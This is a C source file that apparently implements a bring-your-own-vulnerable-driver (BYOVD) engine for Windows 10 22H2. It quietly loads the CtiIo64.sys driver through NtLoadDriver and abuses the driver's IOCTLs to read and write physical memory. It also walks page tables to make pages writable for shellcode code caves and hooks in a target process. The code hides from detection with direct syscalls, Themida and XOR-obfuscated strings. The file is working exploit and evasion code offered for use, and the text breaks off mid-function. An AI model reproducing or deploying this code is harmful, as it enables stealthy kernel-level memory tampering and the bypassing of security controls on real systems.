/*


 * byovd.c  -- CtiIo64.sys BYOVD physical memory engine


 * Load via NtLoadDriver (no SCM, no Event Log), read/write process VA via physical.


 * Direct syscalls via SysNtDeviceIoControlFile (syscalls_asm.asm) -- no DeviceIoControl hook.


 * Win10 22H2 (19045) x64 only.


 *


 * Cycle: Map -> memcpy -> Unmap -> NtClose(SectionHandle)


 * NEVER close SectionHandle before Unmap -- driver uses it to track the VAD mapping.


 */


#include "ThemidaSDK.h"
#include "XorStr.h"
#include "xor_strings.h"


#include "byovd.h"


#include "Resource.h"


#include "syscalls.h"


#include "debug.h"


#include "byovd_lock.h"


#include <windows.h>


#include <objbase.h>


#include <stdio.h>


#pragma comment(lib,"advapi32.lib")


#pragma comment(lib,"ole32.lib")

/* Resource lookup uses the CURRENT module's base — __ImageBase is a magic
 * linker symbol that resolves to the start of the current PE.  Required
 * because byovd.c may live in either Stub.exe (legacy build) or svc.dll
 * (split build), and FindResourceW(NULL,...) would always pick the host
 * EXE (= Stub.exe in the new architecture, which has NO CtiIo64 resource).
 * Using &__ImageBase ensures we always look up resources in the SAME
 * module that compiled this code. */
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
#define BYOVD_SELF_HMODULE  ((HMODULE)&__ImageBase)


#if defined(SERAPH_AGENT_DIAG) && defined(ENABLE_DEBUG)
/* Local diagnosis only: strip with release builds (no SERAPH_AGENT_DIAG). User-mode file append; no driver/kernel changes. */
static void seraph_agent_ndjson(const char *hyp, const char *loc, const char *msg, UINT64 a, UINT64 b, int ok) {
    char line[512];
    int n = snprintf(line, sizeof(line),
        "{\"sessionId\":\"c19bf9\",\"hypothesisId\":\"%s\",\"location\":\"%s\",\"message\":\"%s\","
        "\"data\":{\"a\":%llu,\"b\":%llu,\"ok\":%d},\"timestamp\":%lu}\n",
        hyp, loc, msg, (unsigned long long)a, (unsigned long long)b, ok, (unsigned long)GetTickCount());
    if (n <= 0 || n >= (int)sizeof(line))
        return;
    HANDLE h = CreateFileA("debug-c19bf9.log", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;
    DWORD w;
    WriteFile(h, line, (DWORD)n, &w, NULL);
    SysNtClose(h);
}
#endif




/* IO_STATUS_BLOCK for direct syscalls (winternl.h may conflict with windows.h on some SDKs) */


#ifndef _BYOVD_IOSB_DEFINED


typedef struct { NTSTATUS Status; ULONG_PTR Info; } BYOVD_IOSB;


#define _BYOVD_IOSB_DEFINED


#endif

/* ── XOR-decode helpers: keep kernel API names out of .rdata ──────────── */
#define BYOVD_XOR_KEY 0x4B
/* "ntoskrnl.exe" = 12 chars */
static void _DecNtk(char *out) {
    static const char e[]={0x25,0x3F,0x24,0x38,0x20,0x39,0x25,0x27,0x65,0x2E,0x33,0x2E,0x00};
    for(int i=0;i<12;i++) out[i]=e[i]^BYOVD_XOR_KEY; out[12]=0;
}
static void _DecNtkW(WCHAR *out) {
    char a[14]; _DecNtk(a);
    out[0]=L'\\';
    for(int i=0;i<12;i++) out[i+1]=(WCHAR)a[i]; out[13]=0;
}




/* Ã¢â€â‚¬Ã¢â€â‚¬ Quick log helper (no dependency on gui.c) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


#ifdef ENABLE_DEBUG
static void BYOVD_Log(const char* msg) {
    char buf[512];
    wsprintfA(buf, "[SVC][%lu] %s\r\n", GetTickCount(), msg);
    DbgBuf_Write(buf);
}

#define BYOVD_LogErr(msg) do { \
    char _err_buf[512]; \
    wsprintfA(_err_buf, "BYOVD_ERR: %s", msg); \
    WriteLogFile(_err_buf); \
    DbgBuf_Flush("svc_err.log"); \
} while(0)

static void BYOVD_LogFmtErr(const char* fmt, ...) {
    char tmp[480]; va_list ap; va_start(ap, fmt); vsnprintf(tmp, sizeof(tmp), fmt, ap); va_end(ap);
    tmp[sizeof(tmp)-1] = '\0';
    BYOVD_LogErr(tmp);
}

static void BYOVD_LogFmt(const char* fmt, ...) {
    /* NOTE: wvsprintfA does NOT support %ll specifiers (Win32 limitation).
     * Use vsnprintf (CRT) so %llX / %llu work correctly for 64-bit values. */
    char tmp[480]; va_list ap; va_start(ap, fmt); vsnprintf(tmp, sizeof(tmp), fmt, ap); va_end(ap);
    tmp[sizeof(tmp)-1] = '\0';
    BYOVD_Log(tmp);
}
#else
static void BYOVD_Log(const char* msg){ (void)msg; }
static void BYOVD_LogErr(const char* msg){ (void)msg; }
static void BYOVD_LogFmtErr(const char* fmt,...){ (void)fmt; }
static void BYOVD_LogFmt(const char* fmt,...){ (void)fmt; }
#endif

UINT64      g_aobLogBase       = 0;
const char *g_aobScanTag       = NULL;  /* set before BYOVD_ScanPattern call */
const char *g_aobScanTagPrefix = NULL;  /* set before BYOVD_ScanMultiPattern */

void BYOVD_LogScanResult(const char *feature, UINT64 resultVA)
{
#ifndef NDEBUG
    if (!feature) return;
    char line[256];
    if (!resultVA) {
        wsprintfA(line, "%s: NOT FOUND", feature);
    } else if (g_aobLogBase && resultVA >= g_aobLogBase) {
        wsprintfA(line, "%s: +%I64u", feature, resultVA - g_aobLogBase);
    } else if (g_aobLogBase && resultVA < g_aobLogBase) {
        wsprintfA(line, "%s: -%I64u", feature, g_aobLogBase - resultVA);
    } else {
        wsprintfA(line, "%s: 0x%I64X (no base)", feature, resultVA);
    }
    char path[MAX_PATH]; path[0] = 0;
    DWORD plen = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (plen > 0 && plen < MAX_PATH - 16) {
        char *sep = strrchr(path, '\\');
        if (sep) *(sep+1) = 0;
        /* XOR-decoded log filename to keep name out of .rdata */
        { static const char _lenc[]={0x56,0x4E,0x57,0x4E,0x4B,0x41,0x68,0x4E,0x4E,0x4B,0x6B,0x4E,0x4F,0x57};
          char _ldec[15]; for(int _li=0;_li<14;_li++) _ldec[_li]=_lenc[_li]^0x27; _ldec[14]=0;
          strcat_s(path, MAX_PATH, _ldec); }
    } else {
        { static const char _lenc[]={0x56,0x4E,0x57,0x4E,0x4B,0x41,0x68,0x4E,0x4E,0x4B,0x6B,0x4E,0x4F,0x57};
          char _ldec[15]; for(int _li=0;_li<14;_li++) _ldec[_li]=_lenc[_li]^0x27; _ldec[14]=0;
          strcpy_s(path, MAX_PATH, _ldec); }
    }
    HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, line, (DWORD)strlen(line), &w, NULL);
        WriteFile(h, "\r\n", 2, &w, NULL);
        SysNtClose(h);
    }
#else
    (void)feature; (void)resultVA;
#endif
}





/* ── IOCTL / device ───────────────────────────────────────────────────────────────────────────── */


/* CtiIo64 (CTI) IOCTLs -- maps \Device\PhysicalMemory section into user-mode VAD */


#define IOCTL_CTI_MAP_PHYS    ((DWORD)((0x8010ULL << 16) | 0x2040ULL))   /* MapPhysicalMemory   */
#define IOCTL_CTI_UNMAP_PHYS  ((DWORD)(IOCTL_CTI_MAP_PHYS + 4))   /* UnmapPhysicalMemory */






/* In/out struct for both Map and Unmap IOCTLs.


 * For Map:  fill PhysicalAddress + Size; driver fills VirtualAddress, SectionHandle, ObjectPointer.


 * For Unmap: pass the struct back verbatim (driver needs ObjectPointer to destroy the mapping). */


#pragma pack(push, 8)


typedef struct _CTI_MAP_DATA {


    UINT64 Size;              /* IN  -- offset 0x00, always 0x1000 (one page) */


    UINT64 PhysicalAddress;   /* IN  -- offset 0x08, must be page-aligned     */


    HANDLE SectionHandle;     /* OUT -- close AFTER Unmap, not before         */


    PVOID  VirtualAddress;    /* OUT -- Ring-3 pointer valid after Map        */


    PVOID  ObjectPointer;     /* OUT -- kernel pointer; return intact in Unmap*/


} CTI_MAP_DATA, *PCTI_MAP_DATA;


#pragma pack(pop)





/* ── EPROCESS field offsets (Win10 22H2) ──────────────────────────────────────────────────────── */


#define EP_DIRTABLEBASE   0x028


#define EP_UNIQUEPID      0x440


#define EP_ACTIVELINKS    0x448


#define EP_IMAGENAME      0x5A8


#define EP_PID_TO_NAME    (EP_IMAGENAME - EP_UNIQUEPID)   /* 0x168 */





/* Ã¢â€â‚¬Ã¢â€â‚¬ Globals Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


/* Ã¢â€â‚¬Ã¢â€â‚¬ NtLoadDriver stealth loader Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


static HANDLE    s_hDev        = INVALID_HANDLE_VALUE;


static WCHAR     s_svcName[64] = {0};
/* Stealth: diag step uses numeric code — no string literals in .rdata.
 * Consumers (gui.c) decode via BYOVD_DiagStepName(). */
volatile int g_byovdDiagStep = 0; /* 0=init */


static WCHAR     s_sysPath[MAX_PATH] = {0};


static ULONGLONG s_sysCR3     = 0;


static ULONGLONG s_sysEprocPA = 0;





/* ── VA→PA multi-slot LRU cache (avoids redundant 4-level page walks) ──────── */
#define VAPA_CACHE_SLOTS 64
typedef struct { ULONGLONG cr3; ULONGLONG vaPage; ULONGLONG paBase; ULONGLONG tick; } VAPA_SLOT;
static VAPA_SLOT s_vapaCache[VAPA_CACHE_SLOTS];
static ULONGLONG s_vapaTick = 0;





/* ── FindProcessCR3 name+CR3 cache ───────────────────────────────────────────────────────────── */


static char      s_procNameCache[16] = {0};


static ULONGLONG s_procCR3Cache = 0;





/* Minimal NT types needed for NtLoadDriver/NtUnloadDriver (user-mode, no winternl.h needed) */


typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } BYOVD_US;


typedef NTSTATUS (NTAPI *tNtLD)(BYOVD_US*);


typedef NTSTATUS (NTAPI *tNtUD)(BYOVD_US*);


typedef VOID     (NTAPI *tRtlIUS)(BYOVD_US*, PCWSTR);


/* Syscall function pointers */


static tNtLD pSysNtLoadDriver = NULL;


static tNtUD pSysNtUnloadDriver = NULL;





/* Initialize syscall pointers (call before using) */


static void InitSyscallPointers(void) {


    if (!pSysNtLoadDriver) {


        pSysNtLoadDriver = (tNtLD)SysNtLoadDriver;


    }


    if (!pSysNtUnloadDriver) {


        pSysNtUnloadDriver = (tNtUD)SysNtUnloadDriver;


    }


}





/* ASR structs removed -- CtiIo64 uses CTI_MAP_DATA defined above */





/* ── Cache invalidation helper ────────────────────────────────────────────────────────────────── */


static void InvalidateVAPACache(void) {
    BYOVD_LOCK();
    for (int i = 0; i < VAPA_CACHE_SLOTS; i++) {
        s_vapaCache[i].cr3 = 0; s_vapaCache[i].vaPage = 0;
        s_vapaCache[i].paBase = 0; s_vapaCache[i].tick = 0;
    }
    s_vapaTick = 0;
    BYOVD_UNLOCK();
}

/* ── CtiIo64: map physical memory, copy, unmap ────────────────────────────
 * Order: Map -> memcpy -> Unmap -> NtClose(SectionHandle).
 * NEVER close SectionHandle before Unmap. */

/* Guard: reject physical addresses outside installed RAM.
 * Pages above total physical RAM may be MMIO / GPU BAR / ACPI reserved
 * regions.  Mapping them as PAGE_READWRITE (write-back cached) through
 * \Device\PhysicalMemory aliases the real uncached / write-combining
 * mapping that already exists, causing a Machine Check Exception on the
 * CPU that executes the write -- WHEA_UNCORRECTABLE_ERROR BSOD.
 * Also rejects PA < 0x1000 (null page) to prevent corrupting interrupt
 * descriptor tables on legacy BIOSes.
 * Called under BYOVD_LOCK -- no additional synchronisation needed. */
#define MAX_RAM_RANGES 64
typedef struct { UINT64 start; UINT64 end; } RAM_RANGE;
static RAM_RANGE s_ramRanges[MAX_RAM_RANGES];
static int s_numRamRanges = -1;
static int GetRamRanges(RAM_RANGE *out, int maxRanges); /* forward */
static BOOL IsValidPhysAddr(UINT64 pa) {
    if (pa < 0x1000ULL) return FALSE;
    
    if (s_numRamRanges == -1) {
        BYOVD_LOCK();
        if (s_numRamRanges == -1) {
            s_numRamRanges = GetRamRanges(s_ramRanges, MAX_RAM_RANGES);
            if (s_numRamRanges <= 0) {
                /* Fallback if registry fails */
                s_numRamRanges = 1;
                s_ramRanges[0].start = 0;
                MEMORYSTATUSEX ms = { sizeof(ms) };
                if (GlobalMemoryStatusEx(&ms))
                    s_ramRanges[0].end = ms.ullTotalPhys * 2;
                else
                    s_ramRanges[0].end = 0x200000000ULL;
            }
        }
        BYOVD_UNLOCK();
    }
    
    for (int i = 0; i < s_numRamRanges; i++) {
        if (pa >= s_ramRanges[i].start && pa < s_ramRanges[i].end) return TRUE;
    }
    return FALSE;
}

static BOOL CtiPhysRead(UINT64 pa, void *buf, ULONG n) {
    /* BUGFIX #1: reject MMIO/GPU/ACPI/null PA -- WB-cached alias triggers MCE => WHEA_UNCORRECTABLE_ERROR (PC reboot). */
    if (!IsValidPhysAddr(pa)) return FALSE;
    /* BUGFIX #1b: mapping is exactly 0x1000 -- off-page read hits unmapped VA => BSOD. */
    if (n == 0 || n > 0x1000 || (pa & 0xFFF) + n > 0x1000) return FALSE;
    union {
        CTI_MAP_DATA req;
        BYTE padding[128];
    } io = {0};
    io.req.PhysicalAddress = pa & ~(UINT64)0xFFF;
    io.req.Size            = 0x1000;
    
    BYOVD_IOSB iosb = {0};
    NTSTATUS ns = SysNtDeviceIoControlFile(
        s_hDev, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&iosb,
        IOCTL_CTI_MAP_PHYS, &io.req, sizeof(CTI_MAP_DATA), &io, sizeof(io));
    if (ns < 0 || !io.req.VirtualAddress) {
        InvalidateVAPACache(); return FALSE;
    }
    UINT64 kva = (UINT64)io.req.VirtualAddress + (pa & 0xFFF);
    BOOL readOk = TRUE;
    __try {
        for (ULONG _i = 0; _i < n; _i++) ((UINT8*)buf)[_i] = ((volatile UINT8*)kva)[_i];
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        readOk = FALSE;
    }
    CTI_MAP_DATA unmap = io.req; BYOVD_IOSB iosb2 = {0};
    SysNtDeviceIoControlFile(s_hDev, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&iosb2,
        IOCTL_CTI_UNMAP_PHYS, &unmap, sizeof(unmap), NULL, 0);
    /* driver's unmap already calls ZwClose(SectionHandle) — do NOT double-close */
    return readOk;
}

static BOOL CtiPhysWrite(UINT64 pa, const void *buf, ULONG n) {
    if (!IsValidPhysAddr(pa) || n == 0 || n > 0x1000 || (pa & 0xFFF) + n > 0x1000) return FALSE;
    union {
        CTI_MAP_DATA req;
        BYTE padding[128];
    } io = {0};
    io.req.PhysicalAddress = pa & ~(UINT64)0xFFF;
    io.req.Size            = 0x1000;
    
    BYOVD_IOSB iosb = {0};
    NTSTATUS ns = SysNtDeviceIoControlFile(
        s_hDev, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&iosb,
        IOCTL_CTI_MAP_PHYS, &io.req, sizeof(CTI_MAP_DATA), &io, sizeof(io));
    if (ns < 0 || !io.req.VirtualAddress) {
        DEBUG_BYOVD("CtiPhysWrite: IOCTL FAIL pa=0x%I64X ns=0x%08X kva=%p", pa, (unsigned)ns, io.req.VirtualAddress);
        InvalidateVAPACache(); return FALSE;
    }
    /* CtiIo64 maps with PAGE_READONLY for PA < 4GB ranges.
     * Re-map the same SectionHandle with PAGE_READWRITE via direct syscall.
     * No new kernel handles opened — stealth preserved. */
    PVOID  wBase   = NULL;
    SIZE_T wSize   = 0x1000;
    LARGE_INTEGER wOff;
    wOff.QuadPart  = (LONGLONG)(pa & ~(UINT64)0xFFF);
    NTSTATUS nsMap = SysNtMapViewOfSection(
        io.req.SectionHandle,
        (HANDLE)(LONG_PTR)-1,   /* NtCurrentProcess */
        &wBase, 0, 0x1000, &wOff, &wSize,
        1,              /* ViewShare */
        0,              /* MEM_RESERVE not needed */
        PAGE_READWRITE);
    BOOL writeOk = TRUE;
    if (nsMap >= 0 && wBase) {
        UINT64 kva2 = (UINT64)wBase + (pa & 0xFFF);
        __try {
            /* Atomic-width writes: use the widest naturally-aligned store that
             * covers the data to minimize torn-read windows on other CPUs.
             * x86-64 guarantees atomicity for aligned 1/2/4/8-byte stores.
             * Critical for hook installation: a 5-byte E9 JMP written byte-by-
             * byte lets D2's CPU fetch a partial JMP → crash.  If all N bytes
             * fit in a single aligned qword, one 8-byte MOV makes it atomic. */
            ULONG off = (ULONG)(kva2 & 7);  /* offset within containing qword */
            if (n <= 8 && off + n <= 8) {
                /* Fast path: entire write fits in one aligned qword.
                 * Read current qword, patch our bytes in, write back as one
                 * 8-byte store (atomic to all observers on x86-64). */
                volatile UINT64 *qw = (volatile UINT64*)(kva2 & ~(UINT64)7);
                UINT64 cur = *qw;
                UINT8 *p = (UINT8*)&cur;
                for (ULONG _i = 0; _i < n; _i++) p[off + _i] = ((const UINT8*)buf)[_i];
                *qw = cur;
            } else {
                /* General path: write using widest possible aligned chunks */
                ULONG done = 0;
                while (done < n) {
                    UINT64 addr = kva2 + done;
                    ULONG remain = n - done;
                    ULONG a = (ULONG)(addr & 7);
                    /* If 8-byte aligned and at least 8 bytes remain, write qword */
                    if (a == 0 && remain >= 8) {
                        *(volatile UINT64*)addr = *(UINT64*)((const UINT8*)buf + done);
                        done += 8;
                    } else if ((a & 3) == 0 && remain >= 4) {
                        *(volatile UINT32*)addr = *(UINT32*)((const UINT8*)buf + done);
                        done += 4;
                    } else {
                        ((volatile UINT8*)addr)[0] = ((const UINT8*)buf)[done];
                        done += 1;
                    }
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            DEBUG_BYOVD("CtiPhysWrite: writable-map copy EXCEPTION pa=0x%I64X kva2=0x%I64X", pa, kva2);
            writeOk = FALSE;
        }
        SysNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, wBase);
    } else {
        /* No silent fallback — read-only copy would either AV or do nothing.
         * Better to surface the failure so the caller knows the write was lost. */
        DEBUG_BYOVD("CtiPhysWrite: NtMapViewOfSection FAIL ns=0x%08X pa=0x%I64X — write aborted", (unsigned)nsMap, pa);
        writeOk = FALSE;
    }
    CTI_MAP_DATA unmap = io.req; BYOVD_IOSB iosb2 = {0};
    SysNtDeviceIoControlFile(s_hDev, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&iosb2,
        IOCTL_CTI_UNMAP_PHYS, &unmap, sizeof(unmap), NULL, 0);
    /* driver's unmap already calls ZwClose(SectionHandle) — do NOT double-close */
    return writeOk;
}

/* ── LRU physical page cache (64 slots) ─────────────────────────────────── */
#define PHYS_CACHE_SLOTS 64
typedef struct { UINT64 pa; UINT64 tick; BYTE pg[0x1000]; } PHYS_CACHE_SLOT;
static PHYS_CACHE_SLOT s_pgc[PHYS_CACHE_SLOTS];
static UINT64          s_pgc_tick = 0;

static void PhysCacheFlushAll(void);

static BOOL CtiPhysReadCached(UINT64 pa, void *buf, ULONG n) {
    static DWORD lastFlush = 0;
    DWORD now = GetTickCount();
    if (now - lastFlush > 100) {
        lastFlush = now;
        PhysCacheFlushAll();
    }

    UINT64 base = pa & ~0xFFFULL;
    ULONG  off  = (ULONG)(pa & 0xFFF);
    if (off + n > 0x1000) return FALSE;
    
    BYOVD_LOCK();
    for (int i = 0; i < PHYS_CACHE_SLOTS; i++) {
        if (s_pgc[i].tick && s_pgc[i].pa == base) {
            s_pgc[i].tick = ++s_pgc_tick;
            for (ULONG _i = 0; _i < n; _i++) ((UINT8*)buf)[_i] = s_pgc[i].pg[off + _i];
            BYOVD_UNLOCK();
            return TRUE;
        }
    }
    int victim = 0;
    for (int i = 1; i < PHYS_CACHE_SLOTS; i++)
        if (s_pgc[i].tick < s_pgc[victim].tick) victim = i;
    BYOVD_UNLOCK();
    
    BYTE temp[0x1000];
    if (!CtiPhysRead(base, temp, 0x1000)) return FALSE;
    
    BYOVD_LOCK();
    s_pgc[victim].pa   = base;
    s_pgc[victim].tick = ++s_pgc_tick;
    for (ULONG _i = 0; _i < 0x1000; _i++) s_pgc[victim].pg[_i] = temp[_i];
    for (ULONG _i = 0; _i < n; _i++) ((UINT8*)buf)[_i] = s_pgc[victim].pg[off + _i];
    BYOVD_UNLOCK();
    
    return TRUE;
}
static void PhysCacheInvalidate(UINT64 pa) {
    UINT64 base = pa & ~0xFFFULL;
    BYOVD_LOCK();
    for (int i = 0; i < PHYS_CACHE_SLOTS; i++)
        if (s_pgc[i].pa == base) { s_pgc[i].pa = 0; s_pgc[i].tick = 0; break; }
    BYOVD_UNLOCK();
}
static void PhysCacheFlushAll(void) {
    BYOVD_LOCK();
    for (int i = 0; i < PHYS_CACHE_SLOTS; i++) { s_pgc[i].pa = 0; s_pgc[i].tick = 0; }
    s_pgc_tick = 0;
    BYOVD_UNLOCK();
}
static BOOL PhysRead(UINT64 pa, void *buf, ULONG n) {
    return CtiPhysReadCached(pa, buf, n);
}
static BOOL PhysWrite(UINT64 pa, const void *buf, ULONG n) {
    PhysCacheInvalidate(pa); return CtiPhysWrite(pa, buf, n);
}
static UINT64 PhysReadU64(UINT64 pa){ UINT64 v=0; PhysRead(pa,&v,8); return v; }
static BOOL PhysReadAny(UINT64 pa, void *buf, ULONG n) {
    BYTE *d=(BYTE*)buf; ULONG done=0;
    while(done<n){
        ULONG off=(ULONG)((pa+done)&0xFFF); ULONG chunk=0x1000-off;
        if(chunk>n-done) chunk=n-done;
        if(!CtiPhysReadCached(pa+done,d+done,chunk)) return FALSE;
        done+=chunk;
    }
    return TRUE;
}

static UINT64 VA2PA_uncached(UINT64 cr3, UINT64 va){


    UINT64 e; UINT64 base=cr3&~0xFFFULL;


    e=PhysReadU64(base+((va>>39)&0x1FF)*8);  if(!(e&1)) return 0;


    base=e&0x000FFFFFFFFFF000ULL;


    e=PhysReadU64(base+((va>>30)&0x1FF)*8);  if(!(e&1)) return 0;


    if(e&(1ULL<<7)){ return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF); } /* 1 GB page */


    base=e&0x000FFFFFFFFFF000ULL;


    e=PhysReadU64(base+((va>>21)&0x1FF)*8);  if(!(e&1)) return 0;


    if(e&(1ULL<<7)){ return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF); } /* 2 MB page */


    base=e&0x000FFFFFFFFFF000ULL;


    e=PhysReadU64(base+((va>>12)&0x1FF)*8);  if(!(e&1)) return 0;



    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);


}


/* ── Make a single 4KB page user-writable (set PTE R/W bit) ────────────────
 * Walks the 4-level page table starting from cr3 to locate the PTE for `va`,
 * then ORs bit 1 (R/W) into it.  Also handles 2MB and 1GB large pages.
 *
 * Why this is needed: code-cave pages live in D2's .text section, which the
 * OS maps PAGE_EXECUTE_READ (R/W=0).  Our shellcode mailbox slots write back
 * into the cave (e.g. `mov [rax],rdi`), which fault with EXCEPTION_ACCESS_
 * VIOLATION unless the page is writable.  BYOVD writes bypass the PTE, so
 * the cave contents are correct, but D2's CPU still sees R/W=0 at runtime.
 * Calling this after cave selection makes the page user-writable before the
 * hook fires for the first time.
 *
 * CALLER MUST hold BYOVD_LOCK before calling. */
BOOL BYOVD_SetPageWritable(UINT64 cr3, UINT64 va)
{
    UINT64 base = cr3 & ~0xFFFULL;
    UINT64 e, step;

    /* Level 4 — PML4 */
    step = base + ((va >> 39) & 0x1FF) * 8;
    e = PhysReadU64(step);
    if (!(e & 1)) { DEBUG_BYOVD("SetPageWritable: PML4E not present va=0x%I64X", va); return FALSE; }

    /* Level 3 — PDPT */
    base = e & 0x000FFFFFFFFFF000ULL;
    step = base + ((va >> 30) & 0x1FF) * 8;
    e = PhysReadU64(step);
    if (!(e & 1)) { DEBUG_BYOVD("SetPageWritable: PDPTE not present va=0x%I64X", va); return FALSE; }
    if (e & (1ULL << 7)) { /* 1 GB page */
        UINT64 n = e | 2;
        BOOL ok = CtiPhysWrite(step, &n, 8);
        DEBUG_BYOVD("SetPageWritable: 1GB page va=0x%I64X ptePA=0x%I64X ok=%d", va, step, ok);
        return ok;
    }

    /* Level 2 — PD */
    base = e & 0x000FFFFFFFFFF000ULL;
    step = base + ((va >> 21) & 0x1FF) * 8;
    e = PhysReadU64(step);
    if (!(e & 1)) { DEBUG_BYOVD("SetPageWritable: PDE not present va=0x%I64X", va); return FALSE; }
    if (e & (1ULL << 7)) { /* 2 MB page */
        UINT64 n = e | 2;
        BOOL ok = CtiPhysWrite(step, &n, 8);
        DEBUG_BYOVD("SetPageWritable: 2MB page va=0x%I64X ptePA=0x%I64X ok=%d", va, step, ok);
        return ok;
    }

    /* Level 1 — PT (4 KB PTE) */
    base = e & 0x000FFFFFFFFFF000ULL;
    step = base + ((va >> 12) & 0x1FF) * 8;
    e = PhysReadU64(step);
    if (!(e & 1)) { DEBUG_BYOVD("SetPageWritable: PTE not present va=0x%I64X", va); return FALSE; }
    UINT64 n = e | 2; /* set R/W */
    BOOL ok = CtiPhysWrite(step, &n, 8);
    DEBUG_BYOVD("SetPageWritable: 4KB page va=0x%I64X ptePA=0x%I64X old=0x%I64X new=0x%I64X ok=%d",
                va, step, e, n, ok);
    return ok;
}

static UINT64 VA2PA(UINT64 cr3, UINT64 va){
    static DWORD lastInvalidate = 0;
    DWORD now = GetTickCount();
    if (now - lastInvalidate > 2000) {
        lastInvalidate = now;
        InvalidateVAPACache();
    }

    UINT64 vaPage = va & ~0xFFFULL;
    BYOVD_LOCK();
    /* Check all cache slots */
    for (int i = 0; i < VAPA_CACHE_SLOTS; i++) {
        if (s_vapaCache[i].tick && s_vapaCache[i].cr3 == cr3 && s_vapaCache[i].vaPage == vaPage) {
            s_vapaCache[i].tick = ++s_vapaTick;
            UINT64 ret = s_vapaCache[i].paBase | (va & 0xFFF);
            BYOVD_UNLOCK();
            return ret;
        }
    }
    BYOVD_UNLOCK();
    
    UINT64 pa = VA2PA_uncached(cr3, va);
    if (pa) {
        BYOVD_LOCK();
        /* Find LRU victim */
        int victim = 0;
        for (int i = 1; i < VAPA_CACHE_SLOTS; i++)
            if (s_vapaCache[i].tick < s_vapaCache[victim].tick) victim = i;
        s_vapaCache[victim].cr3 = cr3;
        s_vapaCache[victim].vaPage = vaPage;
        s_vapaCache[victim].paBase = pa & ~0xFFFULL;
        s_vapaCache[victim].tick = ++s_vapaTick;
        BYOVD_UNLOCK();
    }
    return pa;
}





/* Ã¢â€â‚¬Ã¢â€â‚¬ Read/write across page boundaries using process CR3 Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


BOOL BYOVD_ReadVA(UINT64 cr3, UINT64 va, void *buf, ULONG len){


    BYTE *dst=(BYTE*)buf;


    while(len>0){


        ULONG off=(ULONG)(va&0xFFF), chunk=0x1000-off; if(chunk>len) chunk=len;


        UINT64 pa=VA2PA(cr3,va); if(!pa) return FALSE;


